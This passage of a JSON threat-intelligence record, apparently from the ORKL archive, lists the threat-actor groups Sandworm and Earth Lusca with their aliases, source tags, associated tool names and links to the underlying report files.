                "ShadowPad Winnti",
                "SprySOCKS",
                "WinRAR",
                "Winnti",
                "XShellGhost",
                "cobeacon",
                "fscan",
                "lcx",
                "nbtscan"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "8941e146-3e7f-4b4e-9b66-c2da052ee6df",
            "created_at": "2023-01-06T13:46:38.402513Z",
            "updated_at": "2025-03-27T02:00:02.824555Z",
            "deleted_at": null,
            "main_name": "Sandworm",
            "aliases": [
                "G0034",
                "IRIDIUM",
                "Blue Echidna",
                "FROZENBARENTS",
                "Seashell Blizzard",
                "IRON VIKING",
                "ELECTRUM",
                "TeleBots",
                "UAC-0113",
                "UAC-0082",
                "APT44",
                "Quedagh",
                "VOODOO BEAR",
                "TEMP.Noble"
            ],
            "source_name": "MISPGALAXY:Sandworm",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "d53593c3-2819-4af3-bf16-0c39edc64920",
            "created_at": "2022-10-27T08:27:13.212301Z",
            "updated_at": "2025-03-27T02:00:55.529662Z",
            "deleted_at": null,
            "main_name": "Earth Lusca",
            "aliases": [
                "Earth Lusca",
                "TAG-22",
                "Charcoal Typhoon",
                "CHROMIUM",
                "ControlX"
            ],
            "source_name": "MITRE:Earth Lusca",
            "tools": [
                "Mimikatz",
                "PowerSploit",
                "Tasklist",
                "certutil",
                "Cobalt Strike",
                "Winnti for Linux",
                "Nltest",
                "NBTscan",
                "ShadowPad"
            ],
            "source_id": "MITRE",
            "reports": null
        }
    ],
    "ts_created_at": 1673536249,
    "ts_updated_at": 1743041735,
    "ts_creation_date": 1653779680,
    "ts_modification_date": 1653779680,
    "files": {
        "pdf": "https://archive.orkl.eu/39ecfaad483c57532c9a6617bf418121f987b460.pdf",
        "text": "https://archive.orkl.eu/39ecfaad483c57532c9a6617bf418121f987b460.txt",
        "img": "https://archive.orkl.eu/39ecfaad483c57532c9a6617bf418121f987b460.jpg"
    }
}